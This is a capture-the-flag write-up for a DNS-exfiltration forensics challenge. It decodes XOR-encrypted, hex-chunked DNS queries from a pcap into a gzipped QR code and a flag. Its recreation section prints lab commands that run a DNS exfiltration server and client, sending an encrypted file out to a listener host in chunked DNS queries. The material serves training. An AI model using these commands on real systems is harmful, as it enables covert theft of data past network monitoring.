

# Challenge 8 Catch Me If You Can

## Description

The objective of this challenge is analyze the packet capture for signs of data exfiltration using DNS. 

# Solution
**1. Analyze the captured network traffic.**

Analyzing the protocol hierarchy in this packet capture reveals that the majority of this network traffic is comprised of TCP packets at 83.3% while the remainder is 16.7% is UDP packets. After analyzing the various protocols within this network, it should be apparent that there is limited DNS traffic. Using the filter `dns.flags.response==0` we can see that there are only DNS requests initiated from IP `192.168.10.128`.  

**2. Discover interesting DNS requests**

Using the filter `dns.flags.response==0` notice the following packets.    

    No 	Time 		Source 			Destination 	Protocol 	Length 	Inf
    1	0.000000	192.168.10.128	192.168.10.130	DNS			117		Standard query 0x8cc8 A the.xor.password.is.Seneca2025.com OPT
    27	11.270028	192.168.10.128	192.168.10.130	DNS			156		Standard query 0xe633 A 1-4cee666d36bd55583036221731060c05571e464d2765a333b8.catchmeifyoucan-.com OPT
    29	11.288837	192.168.10.128	192.168.10.130	DNS			156		Standard query 0x28a4 A 2-68f1003ec9847173d27015f27ce0ba410d02b820d33b39b3b5.catchmeifyoucan-.com OPT
    31	11.299417	192.168.10.128	192.168.10.130	DNS			156		Standard query 0x00cf A 3-02abc9a22a5b0cdfd1ec3c9950caa8b2b10acdfee38704c743.catchmeifyoucan-.com OPT
    33	11.321644	192.168.10.128	192.168.10.130	DNS			156		Standard query 0x7c4c A 4-f5c778e0f0dee9871de540eb69b4802f3808da927b54179de4.catchmeifyoucan-.com OPT
    35	11.341852	192.168.10.128	192.168.10.130	DNS			156		Standard query 0xeca7 A 5-36a5dc52a0ba8bab99feaca7a48975da69915f68dda9d76991.catchmeifyoucan-.com OPT
    37	11.370176	192.168.10.128	192.168.10.130	DNS			156		Standard query 0x8c4a A 6-f2ae7cd261605dc3328f1802c34d2f9f76224f7b56d69319c6.catchmeifyoucan-.com OPT
    39	11.386579	192.168.10.128	192.168.10.130	DNS			156		Standard query 0x96d8 A 7-6fed0b149bd352e13a02b14fa9d0dd2a1a881f28541298fa65.catchmeifyoucan-.com OPT
    41	11.412476	192.168.10.128	192.168.10.130	DNS			156		Standard query 0xa914 A 8-36e756bd7f00ea3227b1d287de917da36f60c84c5ca6c0c61d.catchmeifyoucan-.com OPT
    43	11.430553	192.168.10.128	192.168.10.130	DNS			156		Standard query 0x46a5 A 9-1c6822a5b6cbfeabd80ead4b3a7dde0b22d74683bd48a0b5be.catchmeifyoucan-.com OPT
    45	11.449624	192.168.10.128	192.168.10.130	DNS			157		Standard query 0x1881 A 10-d98349a6031e99942fdbc9f36b85c1ab6770b7e827783c3235.catchmeifyoucan-.com OPT
    
 From the first packet, the DNS request to `the.xor.password.is.Seneca2025.com` indicates us that  there is some encrypted data using XOR where the password is 'Seneca2025".   
 From the remaining requests there is a pattern where the prefix of the requested URL begins with an incremental number followed by a payload followed by `.catchmeifyoucan-.com`. 

**3. Analyze the payload**

Using the Cyberchef's magic module we can attempt to analyze the first payload from:


    No 	Time 		Source 			Destination 	Protocol 	Length 	Inf
    27	11.270028	192.168.10.128	192.168.10.130	DNS			156		Standard query 0xe633 A 1-4cee666d36bd55583036221731060c05571e464d2765a333b8.catchmeifyoucan-.com OPT
Which is`4cee666d36bd55583036221731060c05571e464d2765a333b8`
Cyberchef's magic module returns the following:

    Matching ops: From Base64, From Base85, From Hex, From Hexdump Valid UTF8 Entropy: 3.61

**4. Piece together entire payload**

We will merge all of the payloads from the step 2 above into a single string as shown below:

    4cee666d36bd55583036221731060c05571e464d2765a333b868f1003ec9847173d27015f27ce0ba410d02b820d33b39b3b502abc9a22a5b0cdfd1ec3c9950caa8b2b10acdfee38704c743f5c778e0f0dee9871de540eb69b4802f3808da927b54179de436a5dc52a0ba8bab99feaca7a48975da69915f68dda9d76991f2ae7cd261605dc3328f1802c34d2f9f76224f7b56d69319c66fed0b149bd352e13a02b14fa9d0dd2a1a881f28541298fa6536e756bd7f00ea3227b1d287de917da36f60c84c5ca6c0c61d1c6822a5b6cbfeabd80ead4b3a7dde0b22d74683bd48a0b5bed98349a6031e99942fdbc9f36b85c1ab6770b7e827783c3235

**5. Decode/Decrypt the encryption**

Using Cyberchef first decode the payload from Hex then use the XOR module with the password 'Seneca2025' and 'UTF8'. The first line of the output should contain the following:

    ␟•␈␈UÜgh␂␃qr_code.txt␀ÍVÛ Ã0
The above output contains 'qr_code.txt' indicating that this is a file. As such download the file using the "Save output to file" option within Cyberchef  

**6. Analyze the file.**

The file is a gzip file containing a file called `qr_code.txt` containing the following QR code:
(Copy the ASCII QR code to a note pad for a better visibility)

    ██████████████████████████████████████████████████████
    ██              ██████████████████  ██              ██
    ██  ██████████  ████  ████████    ████  ██████████  ██
    ██  ██      ██  ██  ██  ██████  ██████  ██      ██  ██
    ██  ██      ██  ██  ██  ██████      ██  ██      ██  ██
    ██  ██      ██  ██  ██  ████    ██  ██  ██      ██  ██
    ██  ██████████  ██  ████████        ██  ██████████  ██
    ██              ██  ██  ██  ██  ██  ██              ██
    ██████████████████  ██████████    ████████████████████
    ██  ██          ████    ████      ████          ██████
    ██      ██  ████      ████    ████  ████  ██  ████████
    ████  ██  ██    ██        ████              ████    ██
    ████  ████    ██  ████  ██████  ██████      ██████  ██
    ██  ██████████    ████████        ██    ██        ████
    ██  ██  ██████████      ██  ██████  ████  ████████████
    ██  ██████████  ████    ██████              ██      ██
    ██  ████    ████    ██████████  ████    ██████████████
    ██  ██          ██    ██  ████              ██      ██
    ██████████████████  ████  ██    ██  ██████      ██████
    ██              ████  ████      ██  ██  ██  ██      ██
    ██  ██████████  ██        ████  ██  ██████  ██████████
    ██  ██      ██  ██    ██                    ██████████
    ██  ██      ██  ██  ████  ██  ████      ██    ██    ██
    ██  ██      ██  ██  ██  ██████  ██    ██  ████████  ██
    ██  ██████████  ████  ████  ██  ██████  ██  ██████  ██
    ██              ██  ██  ██      ████  ██████████    ██
    ██████████████████████████████████████████████████████



**7. Scan the QR Code** 
Using any QR code scanning tool such as you camera app on the IPhone or take a screenshot of the QR code and upload it to https://webqr.com/ to discover the following flag:

    flag{QRcodes_scare_me_man}
    
The challenge is solved!


# Recreating this challenge 
Recreating this challenge is simple however requires a few steps.

**1. Prepare the ASCII QR code and files.**

To create a QR code in terminal I used the script `qr2eascii` from https://github.com/Jojodicus/qr2eascii.
As shown below. 

    └─$ git clone https://github.com/Jojodicus/qr2eascii
    Cloning into 'qr2eascii'...
    remote: Enumerating objects: 63, done.
    remote: Counting objects: 100% (38/38), done.
    remote: Compressing objects: 100% (25/25), done.
    remote: Total 63 (delta 19), reused 27 (delta 12), pack-reused 25 (from 1)
    Receiving objects: 100% (63/63), 14.19 KiB | 2.37 MiB/s, done.
    Resolving deltas: 100% (29/29), done.
                                                                                                                                                                                                      
    └─$ cd qr2eascii 
    └─$ python3 convert.py --invert -i 'flag{QRcodes_scare_me_man}' > qr_code.txt && cat qr_code.txt
    ██████████████████████████████████████████████████████
    ██              ██████████████████  ██              ██
    ██  ██████████  ████  ████████    ████  ██████████  ██
    ██  ██      ██  ██  ██  ██████  ██████  ██      ██  ██
    ██  ██      ██  ██  ██  ██████      ██  ██      ██  ██
    ██  ██      ██  ██  ██  ████    ██  ██  ██      ██  ██
    ██  ██████████  ██  ████████        ██  ██████████  ██
    ██              ██  ██  ██  ██  ██  ██              ██
    ██████████████████  ██████████    ████████████████████
    ██  ██          ████    ████      ████          ██████
    ██      ██  ████      ████    ████  ████  ██  ████████
    ████  ██  ██    ██        ████              ████    ██
    ████  ████    ██  ████  ██████  ██████      ██████  ██
    ██  ██████████    ████████        ██    ██        ████
    ██  ██  ██████████      ██  ██████  ████  ████████████
    ██  ██████████  ████    ██████              ██      ██
    ██  ████    ████    ██████████  ████    ██████████████
    ██  ██          ██    ██  ████              ██      ██
    ██████████████████  ████  ██    ██  ██████      ██████
    ██              ████  ████      ██  ██  ██  ██      ██
    ██  ██████████  ██        ████  ██  ██████  ██████████
    ██  ██      ██  ██    ██                    ██████████
    ██  ██      ██  ██  ████  ██  ████      ██    ██    ██
    ██  ██      ██  ██  ██  ██████  ██    ██  ████████  ██
    ██  ██████████  ████  ████  ██  ██████  ██  ██████  ██
    ██              ██  ██  ██      ████  ██████████    ██
    ██████████████████████████████████████████████████████


I then compressed the qr_code.txt file with the following command:

    gzip -k qr_code.txt 


**2. Begin network capture using Wireshark on MachineB**

(optional step) to create arbitrary network traffic run tool 'noisy' https://github.com/1tayH/noisy. Be sure to modify the configuration file to remove unwanted URLs. 

**3. Start the DNS Server script on MachineB**

On MachineB we will run a DNS server which operates on port 5553 using the provided script `dnsexfil_server_5553.py` following command:


      $ python3 dnsexfil_server_5553.py  <machineB_IP> Seneca2025
           __                     _____ __                                   
      ____/ /___  ________  _  __/ __(_) /    ________  ______   _____  _____
     / __  / __ \/ ___/ _ \| |/_/ /_/ / /    / ___/ _ \/ ___/ | / / _ \/ ___/
    / /_/ / / / (__  )  __/>  </ __/ / /    (__  )  __/ /   | |/ /  __/ /    
    \__,_/_/ /_/____/\___/_/|_/_/ /_/_/____/____/\___/_/    |___/\___/_/     
                                     /_____/                                 
    
    Author: lefayjey
    Version: 1.2.0
    
    
    [+] DNS server started. Press Ctrl+C to stop.

This is a modified script from https://github.com/lefayjey/DNSExfil where the `dnsexfil_server.py` script has been modified to change the DNS port number from 53 to 5553 as to not conflict with the machine's existing DNS server.

**4. On MachineA using Dig send a DNS request containing the XOR key**

The following output is expected

    └─$ dig @<machineB_IP> -p 5553 the.xor.password.is.Seneca2025.com  
    
    ; <<>> DiG 9.20.2-1-Debian <<>> @192.168.10.130 -p 5553 the.xor.password.is.Seneca2025.com
    ; (1 server found)
    ;; global options: +cmd
    ;; Got answer:
    ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 12677
    ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 0
    
    ;; QUESTION SECTION:
    ;the.xor.password.is.Seneca2025.com. IN A
    
    ;; Query time: 12 msec
    ;; SERVER: 192.168.10.130#5553(192.168.10.130) (UDP)
    ;; WHEN: Tue Aug 12 09:05:26 EDT 2025
    ;; MSG SIZE  rcvd: 52

**5. On MachineA execute the DNS Exfiltration script**

This script will first XOR encrypt the file with the provided key, then split the encrypted payload into smaller chunks which is then exfiltrated in DNS requests. 

    └─$ python3 dns_exfil_v4.py -f qr_code.txt.gz -k Seneca2025 -d catchmeifyoucan-.com -s 192.168.10.130 -p 5553 
    [+] Using chunk size: 50
    [+] Total chunks: 10
    [1/10] 1-4cee666d36bd55583036221731060c05571e464d2765a333b8
    [2/10] 2-68f1003ec9847173d27015f27ce0ba410d02b820d33b39b3b5
    [3/10] 3-02abc9a22a5b0cdfd1ec3c9950caa8b2b10acdfee38704c743
    [4/10] 4-f5c778e0f0dee9871de540eb69b4802f3808da927b54179de4
    [5/10] 5-36a5dc52a0ba8bab99feaca7a48975da69915f68dda9d76991
    [6/10] 6-f2ae7cd261605dc3328f1802c34d2f9f76224f7b56d69319c6
    [7/10] 7-6fed0b149bd352e13a02b14fa9d0dd2a1a881f28541298fa65
    [8/10] 8-36e756bd7f00ea3227b1d287de917da36f60c84c5ca6c0c61d
    [9/10] 9-1c6822a5b6cbfeabd80ead4b3a7dde0b22d74683bd48a0b5be
    [10/10] 10-d98349a6031e99942fdbc9f36b85c1ab6770b7e827783c3235
    [+] Done.
           

**6. Stop, confirm and save traffic capture on Wireshark**

Once the script has completed sending out the DNS queries as shown above, verify that the expected DNS UDP traffic to port 5553 has been captured using filter `udp.port==5553`. 

**7. Edit the PCAP file using the `editpcap.py` script to change ports 5553 to 53**

On MachineB once the packet capture is saved, ensure that the file has the correct permissions to be modified by non-root users. To change the port number within the PCAP from 5553 to 53 execute the following command which uses the `editpcap.py` command:

    python3 editpcap.py -i port_5553.pcap -o final_output.pcap

**8. Verify the port numbers have been modified in the output file**

Verify that the port number has been updated from 5553 to 53. Perform the steps from the solution to validate that this challenge has been successfully created. 
This completes the recreation of this CTF Challenge. 










